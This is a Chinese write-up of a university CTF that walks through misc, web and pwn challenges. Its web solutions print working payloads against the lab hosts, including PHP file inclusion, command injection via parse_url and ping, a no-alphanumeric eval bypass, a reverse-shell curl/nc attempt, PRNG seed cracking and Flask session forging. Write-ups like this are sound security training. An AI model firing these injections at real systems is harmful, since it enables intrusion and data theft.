# 校内赛



## Misc

### [Easy] 炸鱼薯条问答-五成熟

AI

Q1：全国高校网安联赛

```
Q1. X-NUCA
Q2. T1071.004
Q3. ArkTS
Q4. 2.26
Q5. MT19937
Q6. HTCPCP
```

![image-20250228210541933](../_media/image-20250228210541933.png)

最终的flag：

```
Aurora{E@sy_as_F1sh_&_Chip5}
```



### [Medium] 炸鱼薯条问答-全熟

上一题没注意，靶机关太快了，又重新答了一遍，答案如上

flag2：

```
Aurora{Mr_Fr1ed_F1sh_K1nG's_AdmiRati0n}
```



### [被弃用] 仰望星空问答

噩梦难度的路由已隐藏在靶机内



```
http://4984200a-dd97-478d-a1ca-52984fc11a57.dynamic.szu.moe/static/bootstrap-5.3.3-dist/js/bootstrap.bundle.min.js.map
```



### [Easy] 怨撃·伪

标题不知道怎么读

```
nc direct.szu.moe 10094
```

提示信息

```
If you want to read the info first, press 1, or press 2 if you want to play the game directly.
Your choice: 1

Welcome to O.N.G.E.K.I.(Pseudo)
There're 3 types of chars, each indicating a different effect:
'x' stands for danmaku, which will cause 10 HP damage if you crush into it.
'-' stands for gap, you can slip through it and no damage will be taken.
'o' stands for bell, touch it and you will heal up 5 HP.

Input 1~7 to change your position each turn.
You will have 3 seconds of reaction time each turn.
If you input nothing during the second, your position will NOT be changed.
Play through 100 turns and you will get your flag!
```



放在pwn里面直接写python程序了，100个回合，不过为了玩游戏，还是玩着先

![image-20250228211534457](../_media/image-20250228211534457.png)

```
Aurora{You_are_a_super_shooter!} 
```





### [Easy]小海龟

Python的turtle的库函数调用即可

分为两部分

`flagpart1`：

```python
import turtle

# 初始化海龟对象
turtle.setup(0.5,0.6)
turtle.screensize(800,3000)
t = turtle.Turtle()
t.speed(0)  # 设置最快绘制速度

# 对应伪代码中的每个步骤
t.left(90)        # lt 90
t.backward(1000)  # bk 1000
t.right(90)       # rt 90
t.pendown()       # pd

t.forward(100)    # fd 100
t.right(135)      # rt 135
t.forward(120)    # fd 120
t.left(135)       # lt 135
t.penup()         # pu

t.forward(35)     # fd 35
t.left(90)        # lt 90
t.forward(85)     # fd 85
t.left(180)       # lt 180
t.pendown()       # pd

t.forward(47)     # fd 47
t.penup()         # pu

t.forward(50)     # fd 50
t.left(90)        # lt 90
t.forward(50)     # fd 50
t.left(180)       # lt 180
t.pendown()       # pd

t.forward(100)    # fd 100
t.left(90)        # lt 90
t.forward(50)     # fd 50
t.left(90)        # lt 90
t.forward(100)    # fd 100
t.penup()         # pu

t.right(90)       # rt 90
t.forward(50)     # fd 50
t.pendown()       # pd

for _ in range(18):
    t.forward(5)
    t.right(10)

t.right(90)       # rt 90
t.forward(55)     # fd 55
t.right(180)      # rt 180
t.forward(100)    # fd 100
t.right(180)      # rt 180
t.forward(50)     # fd 50
t.right(135)      # rt 135
t.forward(70)     # fd 70

t.left(45)        # lt 45
t.penup()         # pu
t.forward(50)     # fd 50
t.pendown()       # pd
t.forward(50)     # fd 50
t.left(90)        # lt 90
t.forward(100)    # fd 100
t.left(90)          # ft 90
t.forward(50)       # fd 50
t.left(90)          # lt 90
t.forward(100)      # fd 100
turtle.done()
```

![image-20250228223603529](../_media/image-20250228223603529.png)





` flagpart2: and_ez_logo`

```python
import turtle

turtle.left(90)
turtle.penup()
turtle.forward(100)
turtle.left(90)
turtle.pendown()
turtle.forward(100)
turtle.right(90)
for _ in range(19):
    turtle.forward(5)
    turtle.right(10)
turtle.left(145)
turtle.forward(55)
turtle.penup()
turtle.left(45)
turtle.forward(45)
turtle.left(90)
turtle.pendown()
turtle.forward(100)
turtle.right(145)
turtle.forward(120)
turtle.left(55)
turtle.left(90)
turtle.penup()
turtle.forward(50)
turtle.left(90)
turtle.forward(70)
turtle.left(180)
turtle.pendown()
turtle.forward(30)
turtle.done()
```



绘图结果如下：

![image-20250228190202301](../_media/image-20250228190202301.png)

综上，所有的flag：

```
Aurora{AURORA_and_ez_logo}
```



### [Easy] 0vO



```python
s = '0O0O000O 0O0OO000 0O0O0OO0 0OOOO00O 0OO000O0 00OO00OO 0O00O0O0 0OO0O000 0OO00O0O 00OO000O 0O0O00O0 0OOOO00O 0OO00O00 0O0O0OOO 0O0O0OO0 0OO00OO0 0O0OO00O 0O0O0OOO 00OO0O0O 0OO0O0OO 0O0OO000 00OO0000 0O0OO0O0 0OO0O000 0OO000O0 0O00O000 0O00OOO0 0OO0OO00 0O0OO000 00OO0000 0O00O0O0 0OOO0000 0OO000O0 0OO0OO0O 0O000OO0 0OOOO00O 0OO00O0O 0O0OO000 00OO0000 00OOOO0O'

s = s.replace(" ","")
s = s.replace("0","0")
s = s.replace("O","1")

for i in range(0,len(s),8):
    print(chr(int(s[i:i+8],2)),end="")
```



解得加密的字符串

```
QXVyb3Jhe1RydWVfYW5kX0ZhbHNlX0JpbmFyeX0=
```

base64解码得：

```
Aurora{True_and_False_Binary}
```



### [Easy]怪怪的音乐

将wav放入audacity中，拉出频谱图来，发现疑似摩斯密码

![image-20250228204715728](../_media/image-20250228204715728.png)

手写下来，直接在线翻译[在线摩斯密码翻译器](https://www.lddgo.net/encrypt/morse)



```
-- --- .-. ... . ..--.- .. -. ..--.- .-- .- ...-
```

翻译结果：题目又说flag形式Aurora{a-z_}，所以要转为小写

```
MORSE_IN_WAV
```

故最终的flag：

```
Aurora{morse_in_wav}
```



### [Medium]凑数的图片题

第一部分的flag直接反写就可以得到了

```python
c = [65, 117, 114, 111, 114, 97, 123, 113, 115, 100, 122, 95, 97, 110, 100]
a = ''
for i in c:
    a += chr(i)
print(a)
```

flagpart1

```
Aurora{qsdz_and
```



直接修改图片高度为1000：

![image-20250228203139490](../_media/image-20250228203139490.png)

得到第二部分的flag

```
_9C±Void
```

丢进随波逐流里面

发现exif信息，应该是第三部分的flag：

```
Image XPComment：_yyds!!!}
```



综上，总的flag：

```
Aurora{qsdz_and_9C±Void_yyds!!!}
```



### [Medium] The Great Banquet

flag.zip需要密码解密，看起来是一道流量分析题目：

Wireshark打开流量包

观察发现了一下，Length=55的数据包怀疑就是解压密码

```
The_password_is_the_title_of_the_challenge
```

难绷

解压密码：

```
The Great Banquet
```

![image-20250228204341463](../_media/image-20250228204341463.png)

看到flag：

```
Aurora{Blessed_4re_7h0se_who_att3nd!}
```



### [Hard]主管！！！（

`flag.docx`进行了加密

`password.docm`提示说查看单位名字被修改为什么？

查看文档属性：

![image-20250228213915606](../_media/image-20250228213915606.png)

得到解密密码：

```
password="manager_change_pd"
```



输入密码进入`flag.docx`

![image-20250228214004869](../_media/image-20250228214004869.png)

```
蝶哥：T-01-68 亡蝶葬儀
```



`flag.docx`文件属性如下：

```
KSOProductBuildVer	=	2052-12.1.0.17827
ICV	= 5F970E09927A40AE8C2B058319F4ADD5_11
```



异想体代号如下：

加粗的代码未验证

|             异想体名称             |     代号     |
| :--------------------------------: | :----------: |
|   Standard Training-Dummy Rabbit   |   O-00-00    |
|           Scorched Girl            |   F-01-02    |
| One Sin and Hundreds of Good Deeds |   O-03-03    |
|        The Queen of Hatred         |   O-01-04    |
|          Happy Teddy Bear          |   T-04-06    |
|             Red Shoes              |   O-04-08    |
|              Theresia              |   T-09-09    |
|              Old Lady              |   O-01-12    |
|           Nameless Fetus           |   O-01-15    |
|      The Lady Facing the Wall      |   F-01-18    |
|           Nothing There            |   O-06-20    |
|              1.76 MHz              |   T-06-27    |
|          Singing Machine           |   O-05-30    |
|        The Silent Orchestra        |   T-01-31    |
|       Warm-Hearted Woodsman        |   F-05-32    |
|           The Snow Queen           |   F-01-37    |
|              Big Bird              |   O-02-40    |
|         All-Around Helper          |   T-05-41    |
|             Spider Bud             |   T-02-43    |
|         Snow White's Apple         | **O-03-93**  |
|        Beauty and the Beast        | **T-01-75**  |
|           Plague Doctor            | **O-05-102** |
|             WhiteNight             | **O-05-102** |
|           Don't Touch Me           | **O-05-63**  |
|       Rudolta of the Sleigh        | **F-02-58**  |
|             Queen Bee              | **T-03-94**  |
|             Bloodbath              | **O-03-103** |
|      Opened Can of WellCheers      | **O-02-56**  |
|              Alriune               | **O-01-04**  |
|         Forsaken Murderer          | **F-01-15**  |
|        Child of the Galaxy         | **O-03-60**  |
|           Punishing Bird           | **O-02-56**  |
| Little Red Riding Hooded Mercenary | **F-03-73**  |
|      Big and Will be Bad Wolf      | **F-03-80**  |
|      Fragment of the Universe      | **O-03-89**  |
|          Crumbling Armor           | **O-05-121** |
|           Judgement Bird           | **O-02-62**  |
|          Apocalypse Bird           | **O-02-63**  |
|         The Little Prince          | **O-04-122** |
|         The King of Greed          | **O-02-40**  |
|              Laetitia              | **F-04-108** |
|  Funeral of the Dead Butterflies   | **T-05-105** |
|           Der Freischütz           | **F-05-109** |
|       Dream of a Black Swan        | **O-06-20**  |
|        The Dreaming Current        | **T-06-27**  |
|        The Burrowing Heaven        | **O-04-04**  |
|           The Naked Nest           | **O-01-12**  |
|       The Knight of Despair        | **O-05-67**  |
|   The Mountain of Smiling Bodies   | **O-02-101** |
|           Schadenfreude            | **O-01-64**  |
|      The Heart of Aspiration       | **T-05-51**  |
|   Notes from a Crazed Researcher   | **O-05-103** |
|           Giant Tree Sap           | **F-05-142** |
|             Flesh Idol             | **O-01-03**  |
|        Mirror of Adjustment        | **T-01-31**  |
|   Shelter from the 27th of March   | **O-05-102** |
|           Fairy Festival           | **T-03-140** |
|            Meat Lantern            | **O-03-90**  |
|       We Can Change Anything       | **D-01-106** |
|       Express Train to Hell        | **O-06-20**  |
|   Scarecrow Searching for Wisdom   | **F-06-127** |
|   Dimensional Refraction Variant   | **O-05-64**  |
|           Skin Prophecy            | **T-06-27**  |
|              CENSORED              | **O-05-102** |
|     Portrait of Another World      | **O-06-20**  |
|          Today's Shy Look          | **O-03-93**  |
|             Blue Star              | **O-05-102** |
|         You Must Be Happy          | **T-01-31**  |
|         Luminous Bracelet          | **O-04-116** |
|        Behavior Adjustment         | **O-05-102** |
|       Old Faith and Promise        | **T-02-43**  |
|             Porccubus              | **F-05-142** |
|             Void Dream             | **D-02-107** |
|      Grave of Cherry Blossoms      | **F-03-272** |
|            The Firebird            | **O-06-20**  |
|                Yin                 | **O-06-20**  |
|                Yang                | **O-06-21**  |
|           Backward Clock           | **O-05-102** |
|           Army In Black            | **O-06-20**  |
|        Il Pianto della Luna        | **O-06-20**  |
|               Ppodae               | **O-03-89**  |
|           Parasite Tree            | **O-01-04**  |
|            Melting Love            | **D-02-107** |
|            Clouded Monk            |   D-01-110   |
|           You're Bald...           | **O-05-102** |



### [Middle-Hard] Strange Love Op.1

观察到域名前面的二进制代码

```
1111111001111111001111111
1000001000001101001000001
1011101001100010001011101
1011101001100001101011101
1011101000111101101011101
1000001010011111101000001
1111111010101010101111111
0000000001100011000000000
1001011011011110010100000
0001100101111010011001001
1110101101011100111000111
0110010000110101000110010
0100011110010011111100011
0100000010010100001100001
1010011101010110010101001
0101100001010001011100000
1111001110101100111111101
0000000010101111100011000
1111111001111011101010011
1000001011001010100010110
1011101001000000111110001
1011101010110011000011000
1011101001000001011011001
1000001000100011011000000
1111111011001001110001011
```



```python
from PIL import Image
from pyzbar.pyzbar import decode

# 原始二进制数据（25x25）
binary_data = [
    "1111111001111111001111111",
    "1000001000001101001000001",
    "1011101001100010001011101",
    "1011101001100001101011101",
    "1011101000111101101011101",
    "1000001010011111101000001",
    "1111111010101010101111111",
    "0000000001100011000000000",
    "1001011011011110010100000",
    "0001100101111010011001001",
    "1110101101011100111000111",
    "0110010000110101000110010",
    "0100011110010011111100011",
    "0100000010010100001100001",
    "1010011101010110010101001",
    "0101100001010001011100000",
    "1111001110101100111111101",
    "0000000010101111100011000",
    "1111111001111011101010011",
    "1000001011001010100010110",
    "1011101001000000111110001",
    "1011101010110011000011000",
    "1011101001000001011011001",
    "1000001000100011011000000",
    "1111111011001001110001011"
]

# 创建25x25的RGB图像
img = Image.new('RGB', (25, 25), color='white')
pixels = img.load()

# 填充像素（1为黑色，0为白色）
for y in range(25):
    for x in range(25):
        if binary_data[y][x] == '1':
            pixels[x, y] = (0, 0, 0)  # 黑色
        else:
            pixels[x, y] = (255, 255, 255)  # 白色

# 放大图像以便扫描识别
img_large = img.resize((250, 250), Image.NEAREST)
img_large.save('qrcode.png')

# 解码二维码
decoded = decode(img_large)
if decoded:
    print("解码结果：", decoded[0].data.decode())
else:
    print("未能识别二维码，请手动检查qrcode.png")
```



解得QRcode：

![image-20250302150233394](../_media/image-20250302150233394.png)



解得flag：

```
Aurora{qsdz_Dai5uk1}
```



### [Medium] Strange Love Op.2

追踪UDP流：

![image-20250301193544030](../_media/image-20250301193544030.png)

```
Do you really want the easter egg flag? Here you go 
```

flag：

```
Aurora{Sakuzyo_BEAM=============_from_CHUNITHM}
```





### [Medium] 原神，启动！

```
显示查看隐藏文字得到提示
```

哈哈改文字颜色也是老套路了，不，flag可不在这里

那么flag究竟会在哪里呢？

据说启用这个文件的宏就能得到flag？





### [Hard] Heart of Android

Triode特别喜欢在手机上做题和出题，某一天他正在用夸克的无痕窗口模式登录Cyberchef出题，但是他没有发现他手机连上的网络并非是校园网，而是Marin高仿的校园网...



## Web

### [easy] 一"剑"连接

![image-20250228201408468](../_media/image-20250228201408468.png)



直接照着做就是了：

![image-20250228201757528](../_media/image-20250228201757528.png)



```
http://e735b82d-57cc-4077-973a-33fc935610dd.dynamic.szu.moe/bAckd0o0o0or.php
ant
```

![image-20250228201855209](../_media/image-20250228201855209.png)



文件目录如下：

![image-20250228202243929](../_media/image-20250228202243929.png)

忘记提示了，找了有一段时间，flag如下：

```
Aurora{f5f3153d-b86b-4809-bd1f-a9ad5366d6c3}
```



### [easy] Just Signin

进去直接源码

```php
<?php
  highlight_file(__FILE__);
  error_reporting(0);
//flag is in flag.php
  $u = $_GET['__err0r233.yyds'];
  include $u;
?>
```



因为有`error_reporting(0);`，所以不会有显示啥的

再者这个参数传参的时候可能无法正确直接传递，在php中变量名只有数字字母下划线，低版本php中被get或者post传入的变量名，如果含有空格、+、[则会被转化为_，但是一个字符中仅转换一次

所以还是得构造：

```
?_[err0r233.yyds=php://filter/convert.base64-encode/resource=flag.php
```

得到结果：

```
PD9waHANCiAgICAkZmxhZyA9ICJBdXJvcmF7ZTY1NDkxMjgtN2YwYy00ODNmLTg0MTItOGMyMTQ1M2IwY2NhfSI7DQo/Pg==
```

![image-20250301113823138](../_media/image-20250301113823138.png)

最终的flag如下：

```
Aurora{e6549128-7f0c-483f-8412-8c21453b0cca}
```



### [medium]URL_Parser

点进靶机发现源码：

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $u = $_GET['url'];
    $data = parse_url($u);
    if($data['scheme'] === 'getflag'){
        if($data['user'] === 'Err0r233'){
            if(md5($data['pass']) === '3fde6bb0541387e4ebdadf7c2ff31123'){
                system($data['host']);
            }
            else{
                die('password error');
            }
        }
        else{
            die('username error');
        }
    }
    else{
        die('protocol error');
    }
?>
```



第一步的重点是：`parse_url`函数

如一个链接：

```
http://username:password@hostname/path?arg=value#anchor
```

该函数解析为：

```
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
```



题目要求：

```
[scheme] => getflag
[user] => Err0r233
[pass] =>  1q2w3e
[host]	=> rce
```



构造：

```
?url=getflag://Err0r233:1q2w3e@ls
```

![image-20250301115133630](../_media/image-20250301115133630.png)



发现：

```
flag_b567eceb-0b61-4507-b6a1-5f967daa00cc
```

最终payload：

```
?url=getflag://Err0r233:1q2w3e@cd ..;cd ..;cd ..;cat flag_b567eceb-0b61-4507-b6a1-5f967daa00cc
```



得到flag：

```
Aurora{7e6daf3f-f376-4305-bce5-fd13f58b4147}
```



### [middle-hard]天才麻将ctfer

给出提示来了

```
http://47af77c2-7720-4677-a0dd-a6da613b4e60.dynamic.szu.moe/src.html
```

有`index.php`和`func.php`的源码：

源码审计一下：

```php
if(isset($_POST['guess'])){
        if($_POST['guess']===$res){
            $flag = file_get_contents('/flag');
            $ret = "猜对了! 给你flag: $flag";
        }
        else{
            $ret = "猜错了!";
        }
    } 
if(isset($_GET['action'])){
        if($_GET['action']==='getdata'){
            $ret = get_random_str($seed);
        }
    }
```

```php
<?php
    highlight_file(__FILE__);
    function get_random_str($seed){
        mt_srand($seed); //为了保证种子一致，不影响做题。
        $ret = '';
        $ret .= "一姬悄悄告诉你生成牌山的随机数重新组成的随机序列是: ";
        $str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        $str = '';
        for ( $i = 0; $i < 10; $i++ ){
            $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);//这是什么呢?
        }
        $ret .= $str; 
        $ret .= ", 这下应该可以看穿对手的牌了喵!";
        return $ret;
    }
?>
```



获取当前的随机序列：

```
http://47af77c2-7720-4677-a0dd-a6da613b4e60.dynamic.szu.moe/?action=getdata
```

如下：

```
fRpkp5ezjt
```



找到随机数：

```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='fRpkp5ezjt'
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```



```
5 5 0 61 53 53 0 61 15 15 0 61 10 10 0 61 15 15 0 61 31 31 0 61 4 4 0 61 25 25 0 61 9 9 0 61 19 19 0 61 
```

[php_mt_seed - PHP mt_rand() seed cracker](https://www.openwall.com/php_mt_seed/)



```
./php_mt_seed 5 5 0 61 53 53 0 61 15 15 0 61 10 10 0 61 15 15 0 61 31 31 0 61 4 4 0 61 25 25 0 61 9 9 0 61 19 19 0 61 
```



```
seed = 0x17a0c67b = 396412539 (PHP 7.1.0+)
```



观察一下核心的代码，稍作修改，直接去在线网站运行一下：[PHP 在线工具 | 菜鸟工具](https://www.jyshare.com/compile/1/)

```php
<?php
    //index.php
    $seed = 396412539;
    $maj = ['1m', '2m', '3m', '4m', '5m', '6m', '7m', '8m', '9m', '1p', '2p', '3p', '4p', '5p', '6p', '7p', '8p', '9p', '1s', '2s', '3s', '4s', '5s', '6s', '7s', '8s', '9s'];
    mt_srand($seed);
    $str='';
    for($i=0;$i<5;$i++){
        $str .= $maj[mt_rand() % 27];
    }
    $res = '';
    for($i=0;$i<3;$i++){
        $res .= $maj[mt_rand() % 27];
    }
	echo $res;
?>
```

```
9s8m8m
```

![image-20250301145850747](../_media/image-20250301145850747.png)

```
Aurora{64ddf352-a92a-40eb-b845-1dae212059aa}
```



### [middle-hard] 天才麻将ctfer - 全国大赛篇

还是一样做法，只不过就是需要一次成功！

```
http://a7304b2f-c835-47be-8c69-6bf45cc53203.dynamic.szu.moe?action=getdata
```

随机序列：

```
6IS6dU2R4k
```



```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='6IS6dU2R4k'
length = len(str2)
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```



```
32 32 0 61 44 44 0 61 54 54 0 61 32 32 0 61 3 3 0 61 56 56 0 61 28 28 0 61 53 53 0 61 30 30 0 61 10 10 0 61 
```



```
./php_mt_seed 32 32 0 61 44 44 0 61 54 54 0 61 32 32 0 61 3 3 0 61 56 56 0 61 28 28 0 61 53 53 0 61 30 30 0 61 10 10 0 61 
```

生成：

```
118248123
```



```php
<?php
    $seed = 118248123;
    $maj = ['1m', '2m', '3m', '4m', '5m', '6m', '7m', '8m', '9m', '1p', '2p', '3p', '4p', '5p', '6p', '7p', '8p', '9p', '1s', '2s', '3s', '4s', '5s', '6s', '7s', '8s', '9s', '1z', '2z', '3z', '4z', '5z', '6z', '7z', '0p', '0s', '0m'];
    $status = false;
    #count($maj) = 37;
    mt_srand($seed);
    $str='';
    for($i=0;$i<5;$i++){
        $str .= $maj[mt_rand() % 37];
    }
    $res = '';
    for($i=0;$i<5;$i++){
        $res .= $maj[mt_rand() % 37];
    }
	echo $res;
?>
```



答案：

```
2p7m4z0m4s
```



关注：需要注意的就是需要一次成功，因为一旦不成功就有/tmp/request_time这个文件生成，导致后面无法获取flag。

```php
 if(isset($_POST['guess'])){
        if (!file_exists("/tmp/request_time")){
            file_put_contents("/tmp/request_time", "1");
            if($_GLOBALS['submit'] !== 1){
                if($_POST['guess']===$res){
                    $flag = file_get_contents('/flag');
                    $ret = "猜对了! 给你flag: $flag";
                    $status = true;
                }
                else{
                    $ret = "猜错了!";
                    $status = false;
                    
                }
            }
        }
        else{
            die("你穷举的方式我很不喜欢哦~");
        }
    }
```



```
Aurora{c141d206-8676-4729-a2a6-95c2a32cb898}
```



### [middle-hard] SpeedTest

进去经典的ping，而且似乎是json格式返回的



```
host=127.0.0.1
```

而且基本是无回显的，所以可能需要反弹shell，但很可惜，外网不可以被访问

```
host=127.0.0.1;curl xxx.xxx.xxx.xx:7777

nc -lvp 7777
```



所以看一下可不可以写文件，然后访问该路径：

```
127.0.0.1; ls /> /var/www/html/result.txt

http://e2e2a339-89aa-457b-a267-0e500a3e5050.dynamic.szu.moe/result.txt
```



![image-20250302153652895](../_media/image-20250302153652895.png)

```
127.0.0.1; cat  /f1@@@@@@@@@@@@@@g_data> /var/www/html/result.txt
```



得到flag：

```
Aurora{c4e30fd1-cd95-4506-90cb-ae05696c0109}
```



### [hard] yet_another_rce

打开靶机，F12

![image-20250228214700392](../_media/image-20250228214700392.png)

```
http://a364579a-17e0-4113-a7e0-6ce75c8dcf04.dynamic.szu.moe/
```



访问该网址：

```
https://err0r233.github.io/posts/17365.html
qsdzyyds_@nd_t3y_hard_667384
```



得到源代码

```php
//src code for yet_another_rce
<?php

//something hide here ..?
highlight_string(shell_exec("cat ".__FILE__." | grep -v preg_match | grep -v highlight | grep -v REQUEST | grep -v die | grep -v }"));

$cmd = $_REQUEST["c"];

if (preg_match("/[A-Za-oq-z0-9$]+/",$cmd)){
    die("character error");
}

if(preg_match("/\~|\!|\@|\#|\%|\^|\&|\*|\(|\)|\（|\）|\-|\_|\{|\}|\[|\]|\'|\"|\:|\,/",$cmd)){
    die("symbol error");
}

eval($cmd);

?>
```

可以看到基本上所有特殊字符都给过滤掉了，寻常的字母和数字也不行了

但是留有

```
综上
字符p没有被ban掉
<>没有被ban掉
?没有被ban掉
.没有被ban掉
/没有被ban掉
=没有被ban掉
+没有被ban掉
;没有被ban掉
&没有ban掉
``没有ban掉
```



- ?>：关闭之前的PHP标签（若有）。
- <?=：获得回显
- ``/???/p?``：反引号内执行通配符匹配的命令：

```
?><?= `/???/p?` ?>
```



```
http://a364579a-17e0-4113-a7e0-6ce75c8dcf04.dynamic.szu.moe/?c=?><?= `/???/p?` ?>
```

![image-20250228223903621](../_media/image-20250228223903621.png)

==中途换靶机了，所以域名发生了变化，无所谓==

![image-20250228225701103](../_media/image-20250228225701103.png)





所以直接模糊匹配：

```
c=?><?=`/???/??? ????.p?p`?>
模糊匹配出/bin/cat flag.php
```

发现不太行



上网查了一下消息，也是ctfshow的题目



所以考虑使用临时文件的方式进行`getshell`

原理：在php里面，只要我们有上传文件请求包发送，那么php就会把这个文件存到临时文件里面而在nginx里面这个目录一般为\tmp目录

```
/?c=?><?=`.%20/??p/p?p??????`;?>
```



上传文件，里面包含命令，使用上述get参数获取命令回显

```
Content-Type: multipart/form-data; boundary=hello1234567890
Connection: keep-alive
Content-Length: 155

--hello1234567890
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain

#! /bin/sh

ls
--hello1234567890--
```

数据包修改如下：

![image-20250301190036182](../_media/image-20250301190036182.png)



```
ls /
发现有个flag.txt
cat flag.txt即可
```



![image-20250301190203032](../_media/image-20250301190203032.png)

```
cat flag.txt
```

拿到flag：

```
Aurora{d25d6a6b-99c7-4033-b00b-fab0f958f11a}
```



### [medium] map_api（下架了）（又上架了）

说要去美团的网站找个腾讯地图的api-key

查看官方文档，ip定位的api形如：

```
https://apis.map.qq.com/ws/location/v1/ip?ip=111.206.145.41&key=[你的key]
```

```
[43.139.252.204]
```

并且key的形式形如：

```
key=OB4BZ-D4W3U-B7VVO-4PJWW-6TKDJ-*****
```



点进该页面https://ecom.meituan.com/

寻找有ip定位这项服务的站点

发现大众点评里面有个定位深圳的地方

找了一圈感觉没有qq.com

但是找到一个美团的iplocate?的路由

![image-20250301103634899](../_media/image-20250301103634899.png)



```
https://lbsapi.meituan.com/v1/iplocate?key=m83f6a534ca2421d96e058a714b7b67w&ip=210.39.1.60
```

只找到美团自己的：

![image-20250301105531184](../_media/image-20250301105531184.png)



进去大众点评里面那个商店位置定位那里

不是很懂，这个格式都是一模一样的，也不行，模拟请求访问也成功了呀？

![image-20250301111216781](../_media/image-20250301111216781.png)



```
flag{4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H}
```



再次尝试，也可能是这种定位手法：

```
https://apis.map.qq.com/tools/geolocation?key=4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H&amp;referer=qqmap
https://map.qq.com/api/js?v=2.exp&amp;key=4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H&amp;libraries=drawing,geometry
```



在定位页面中找到该信息：还是不正确

```
https://apis.map.qq.com/tools/geolocation?key=VFUBZ-JIR3D-Z2M4H-PPAGG-G5KVQ-S3F2S&amp;referer=locationPicker
flag{VFUBZ-JIR3D-Z2M4H-PPAGG-G5KVQ-S3F2S}
```



回归到原始的链接，会不会是进行了硬编码？没有将Key直接摆出来？爬取形如这样的链接：

```
https://apis.map.qq.com/ws/location/v1/ip?ip=&key=4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H
```



```
https://apis.map.qq.com/ws/location/v1/ip?callback=window._JSONP_callback.JSONP8434&ip=210.39.1.60&key=4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H&apptag=h5loc_ip_loc&output=jsonp&t=1740906981190
```



```
Aurora{4VQBZ-ZGO3G-VGSQE-ILN4G-LWFUK-5WB7H}
```



```
flag{I3OBZ-MBSRQ-WBJ5P-G5VZS-QGAIF-Y7B27}
```



还是得进去，然后找就是了

最终flag：

```
flag{6ULBZ-4X3C3-QEK3S-3ZRI6-6D7RE-WQFRQ}
```







### [Impossible+] hard_jvav

不知道啥漏洞，但是看lib有如下：

```
fastjson-1.2.48.jar

log4j-2.17.2.jar

tomcat-9.0.68.jar
```



看起来是fastjson的反序列漏洞






关注一下index函数：

```java
@RestController
public class IndexController {
   @RequestMapping({"/"})
   public String index(@RequestParam(name = "data",required = false) String data, Model model) {
      if (data == null) {
         return "<h1>Try to post me \"data\"</h1>";
      } else {
         try {
            byte[] decode = B64Decoder.b64decode(data.replaceAll("-", "+"));
            MyObjectInputStream myObjectInputStream = new MyObjectInputStream(new ByteArrayInputStream(decode));
            new MyBlackList();
            MyBlackList.check(new String(decode));
            myObjectInputStream.readObject();
            return "Object Read Successfully.";
         } catch (Exception var5) {
            var5.printStackTrace();
            model.addAttribute("msg", "data=");
            return var5.toString();
         }
      }
   }
}

```



index函数代码就是要传一个post数据上去，然后将data中的-替换为+，然后解码，把解码后的字节数组用ByteArrayInputStream包装

然后传给`MyObjectInputStream`的构造函数，创建一个myObjectInputStream对象，并调用`MyBlackList.check()`检查解码后的字符

后调用myObjectInputStream.readObject()，这里应该是反序列化漏洞，但是构造的时候有黑名单限制：

```
 private static String[] blackList = new String[]{"java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArray", "org.springframework.aop.target.HotSwappableTargetSource", "com.sun.org.apache.xpath.internal.objects.XString"};
```



```
 private static final String[] blackList = new String[]{"java.security", "java.rmi", "com.fasterxml", "org.yaml", "javax.management.remote", "BadAttributeValueExpException", "SignedObject"};
```



参考：[FastJSON(全系漏洞分析-截至20230325) - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/361576.html)





### [Middle-hard] goForum



### [middle-hard] SSSQQQLLL!!!

```
呼呼呼, 给你一点waf: return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```



### [middle-hard] Share Page

随便注册，登录进去，就一个框

感觉是xss

```
<h3>Hi I'm admin</h3>welcome to my page
<script>alert(1)</script>
```



```
<script>alert&#40;1&#58;</script>
```

进行了相应的编码



### [middle-hard] ezcrack

字典就是可以下载的文件

还带个验证码



### [medium] ez_session

他说开启了debug模式，那就发送点东西让他报错即可



```
ll
```



![image-20250308111445968](../_media/image-20250308111445968.png)

爆源码了：



```
app.secret_key = '0544aae9d4a1'  # 设置一个用于加密 session 的密钥
@app.route('/admin')
def admin():
    if 'username' in session:
```





```
python flask_session_cookie_manager3.py encode -s "0544aae9d4a1" -t "username"
```



## Pwn

### [Easy] nc

基本的命令使用

```
nc direct.szu.moe 10004
```

```
ls
cat flag
```

![image-20250228192208132](../_media/image-20250228192208132.png)



### [Easy] nc2

```
nc direct.szu.moe 10013
```



标准输入输出出错，重定向一下

```
exec 1>&2
```

然后ls查看文件

```
cat gift/flag/flag
```

![image-20250301142716682](../_media/image-20250301142716682.png)

```
Aurora{c8b5106c-a707-4875-8852-c663257b8678}
```



### [Medium] 寰宇蝗灾

```
checksec pwn
```

![image-20250301152503316](../_media/image-20250301152503316.png)







### [Medium] 口算Master

```
nc direct.szu.moe 10052
```



口算但是程序



直接使用pwntools来获取数据，然后eval计算直接返回即可

获取数据形如：

```
Welcome to Cirno's calculate classroom!
Let's have 100 e4zy math challenges!
U have 5 minutes to solve these challenges.
77470256 * 88961202 = ?
```



rop：

```python
from pwn import *
import string
context(arch='amd64', os='linux', log_level='debug')
